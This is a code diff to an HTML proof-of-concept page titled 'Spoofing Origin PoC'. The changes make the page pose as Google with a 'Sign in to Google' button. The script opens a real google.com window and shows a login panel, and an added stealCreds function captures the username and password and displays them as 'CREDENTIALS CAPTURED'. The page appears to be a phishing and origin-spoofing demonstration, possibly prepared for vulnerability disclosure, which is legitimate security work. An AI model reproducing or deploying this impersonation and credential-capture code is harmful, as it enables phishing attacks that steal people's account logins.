@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Spoofing PoC</title>
+    <title>Spoofing Origin PoC</title>
     <style>
       body {
         margin: 0;
@@ -48,7 +48,8 @@
   </head>
   <body>
     <div class="box">
-      <h2>This page is official from Google, to prove it you have to click the 'Sign in to Google' button below.</h2>
+      <h1>Google</h1>
+      <p>Click the button below to continue.</p>
       <button onclick="runPoC()">Sign in to Google</button>
 
       <div
@@ -97,6 +98,26 @@
     </div>
 
     <script>
+      function stealCreds(event) {
+        event.preventDefault();
+
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+
+        if (username && password) {
+          document.getElementById("result").innerHTML = `
+            <strong style="color:green;">CREDENTIALS CAPTURED</strong><br>
+            Username: ${username}<br>
+            Password: ${password}
+          `;
+          document.getElementById("username").value = "";
+          document.getElementById("password").value = "";
+        } else {
+          document.getElementById("result").innerHTML =
+            '<span style="color:red;">Please fill in both fields</span>';
+        }
+      }
+
       function runPoC() {
         const w = window.open("https://www.google.com/csi", "_blank");
         document.getElementById("panel").style.display = "block";
